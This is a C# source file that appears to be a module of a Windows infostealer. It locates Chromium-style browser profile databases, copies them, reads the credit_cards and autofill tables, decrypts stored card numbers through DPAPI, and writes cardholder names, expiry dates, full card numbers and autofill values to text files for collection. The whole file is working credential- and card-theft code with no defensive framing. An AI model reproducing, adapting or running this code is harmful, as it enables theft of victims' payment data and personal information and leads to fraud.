using NoiseMe.Drags.App.Data.SQLite;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;


namespace who.Func
{
    class CC
    {
        public static int Count;

        public static string DecryptBlob(string EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
        {
            return DecryptBlob(Encoding.Default.GetBytes(EncryptedData), dataProtectionScope, entropy);
        }

        public static string DecryptBlob(byte[] EncryptedData, DataProtectionScope dataProtectionScope, byte[] entropy = null)
        {
            try
            {
                if (EncryptedData == null || EncryptedData.Length == 0)
                {
                    return string.Empty;
                }
                byte[] bytes = ProtectedData.Unprotect(EncryptedData, entropy, dataProtectionScope);
                return Encoding.UTF8.GetString(bytes);
            }
            catch (CryptographicException)
            {
                return string.Empty;
            }
            catch 
            {
                return string.Empty;
            }
        }

        public static string CreateTempPath()
        {
            return (Path.Combine(Path.Combine(Environment.ExpandEnvironmentVariables("%USERPROFILE%"), "AppData\\Local\\Temp", "tempDataBase" + DateTime.Now.ToString("O").Replace(':', '_') + Thread.CurrentThread.GetHashCode() + Thread.CurrentThread.ManagedThreadId)));
        }

        public static string CreateTempCopy(string filePath)
        {
            string text = CreateTempPath();
            File.Copy(filePath, text, overwrite: true);
            return text;
        }

        public static List<string> FindPaths(string baseDirectory, int maxLevel = 4, int level = 1, params string[] files)
        {
            List<string> list = new List<string>();
            if (files == null || files.Length == 0 || level > maxLevel)
            {
                return list;
            }
            try
            {
                string[] directories = Directory.GetDirectories(baseDirectory);
                foreach (string path in directories)
                {
                    try
                    {
                        DirectoryInfo directoryInfo = new DirectoryInfo(path);
                        FileInfo[] files2 = directoryInfo.GetFiles();
                        bool flag = false;
                        for (int j = 0; j < files2.Length; j++)
                        {
                            if (flag)
                            {
                                break;
                            }
                            for (int k = 0; k < files.Length; k++)
                            {
                                if (flag)
                                {
                                    break;
                                }
                                string a = files[k];
                                FileInfo fileInfo = files2[j];
                                if (a == fileInfo.Name)
                                {
                                    flag = true;
                                    list.Add(fileInfo.FullName);
                                }
                            }
                        }
                        foreach (string item in FindPaths(directoryInfo.FullName, maxLevel, level + 1, files))
                        {
                            if (!list.Contains(item))
                            {
                                list.Add(item);
                            }
                        }
                        directoryInfo = null;
                    }
                    catch
                    {
                    }
                }
                return list;
            }
            catch
            {
                return list;
            }
        }

        private static List<string> GetProfile()
        {
            List<string> list = new List<string>();
            try
            {
                list.AddRange(FindPaths(Dirs.AppData, 4, 1, "Login Data", "Web Data", "Cookies"));
                list.AddRange(FindPaths(Dirs.LocalAppData, 4, 1, "Login Data", "Web Data", "Cookies"));
                return list;
            }
            catch
            {
                return list;
            }
        }

        public static List<string> CC_List = new List<string>();
        public static void Get_CC(string profilePath)
        {        

            try
            {
                string text = Path.Combine(profilePath, "Web Data");

                CNT cNT = new CNT(CreateTempCopy(text));
                cNT.ReadTable("credit_cards");
                for (int i = 0; i < cNT.RowLength; i++)
                {
                    Count++;
                    try
                    {
                        CC_List.Add("Name : " + cNT.ParseValue(i, "name_on_card").Trim() + Environment.NewLine + "Ex_Month And Year: " + Convert.ToInt32(cNT.ParseValue(i, "expiration_month").Trim()) + "/" + Convert.ToInt32(cNT.ParseValue(i, "expiration_year").Trim() + Environment.NewLine + "Card_Number" + DecryptBlob(cNT.ParseValue(i, "card_number_encrypted"), DataProtectionScope.CurrentUser).Trim()));
                    }
                    catch
                    {
                    }

                }               
            }
            catch
            {

            }            
        }

        private static string GetRoadData(string path)
        {
            try
            {
                return path.Split(new string[1]
                {
                    "AppData\\Roaming\\"
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries)[0];
            }
            catch
            {
            }
            return string.Empty;
        }
        private static string GetLclName(string path)
        {
            try
            {
                string[] array = path.Split(new string[1]
                {
                    "AppData\\Local\\"
                }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
                {
                    '\\'
                }, StringSplitOptions.RemoveEmptyEntries);
                return array[0] + "_" + array[1];
            }
            catch
            {
            }
            return string.Empty;
        }
        public static void Get()
        {
            foreach (var rootPath in GetProfile())
            {
                string fullName = new FileInfo(rootPath).Directory.FullName;
                string text = rootPath.Contains(Dirs.AppData) ? GetRoadData(fullName) : GetLclName(fullName);
                string path = new FileInfo(rootPath).Directory.FullName;

                Get_CC(fullName);
                AutoFills.get_Autofill(fullName, text);
            }
            
            string result = "";
            string Autofills_result = "";

            foreach (var a in AutoFills.Autofill)
            {
                Autofills_result += a;
            }

            foreach (var a in CC_List)
            {
                result += Environment.NewLine + a;
            }

            if (!Directory.Exists(Dirs.WorkDir + "\\Browsers"))
                Directory.CreateDirectory(Dirs.WorkDir + "\\Browsers");

            if (result != "")
                File.WriteAllText(Dirs.WorkDir + "\\Browsers\\CC.txt", result, Encoding.Default);

            if (Autofills_result != "")
                File.WriteAllText(Dirs.WorkDir + "\\Browsers\\Autofills.txt", Autofills_result, Encoding.Default);
        }
    }

    class AutoFills
    {
        public static int Count;
        public static List<string> Autofill = new List<string>();

        public static void get_Autofill(string profilePath, string browser_name)
        {
            try
            {
                string text = Path.Combine(profilePath, "Web Data");

                CNT cNT = new CNT(CC.CreateTempCopy(text));
                cNT.ReadTable("autofill");
                for (int i = 0; i < cNT.RowLength; i++)
                {
                    Count++;
                    try
                    {
                        Autofill.Add(Environment.NewLine + "Name : " + cNT.ParseValue(i, "name").Trim() + Environment.NewLine + "Value : " + cNT.ParseValue(i, "value").Trim() + Environment.NewLine + "Browser : " + browser_name + Environment.NewLine);
                        Count++;
                    }
                    catch
                    {
                    }
                }

            }
            catch
            {

            }
        }       
    }
}
